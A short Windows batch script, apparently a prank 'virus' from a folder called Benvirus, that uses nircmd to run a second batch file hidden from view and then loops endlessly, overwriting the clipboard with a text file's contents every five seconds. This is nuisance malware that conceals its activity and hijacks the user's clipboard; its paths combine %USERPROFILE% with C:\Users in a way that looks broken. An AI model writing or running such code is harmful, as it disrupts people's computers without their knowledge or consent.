@echo off
nircmd exec hide C:\Users\%USERPROFILE%\Pictures\ben2.bat
:ben
nircmd.exe clipboard readfile "C:\Users\%USERPROFILE%\Pictures\Benvirus\benvirus\Benbraille.txt"
timeout /t 5 /nobreak
GOTO :ben
